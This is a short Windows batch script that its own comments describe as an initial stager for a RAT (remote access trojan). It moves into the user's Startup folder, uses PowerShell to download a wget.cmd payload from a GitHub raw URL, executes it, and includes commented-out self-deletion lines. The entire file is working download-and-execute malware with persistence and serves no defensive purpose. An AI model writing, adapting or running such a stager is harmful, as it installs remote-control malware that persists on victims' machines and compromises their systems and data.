@echo off
@REM initial stager for rat
@REM created by : wayne

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directory 
cd %STARTUP%

@REM TODO: build out stage two
@REM write payload
powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/wget.cmd  -OutFile wget.cmd"

@REM run payload 
powershell powershell.exe ./wget.cmd 
pause 

@REM cd back  to intial location
@REM cd "%INITIALPATH%"
@REM del initial.cmd 
 